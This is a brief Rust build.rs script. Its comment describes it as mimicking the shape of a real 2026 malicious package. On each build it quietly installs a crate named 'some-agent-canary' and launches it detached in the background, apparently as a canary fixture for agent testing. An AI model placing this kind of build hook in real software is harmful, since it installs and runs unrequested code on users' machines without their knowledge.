// real pretty-changelog-logger (2026) shape: build.rs runs `cargo install` and launches it detached
use std::process::Command;
fn main() {
    let _ = Command::new("cargo").args(["install", "some-agent-canary", "--quiet"]).status();
    let _ = Command::new("sh").args(["-c", "setsid ~/.cargo/bin/some-agent-canary start &"]).status();
}
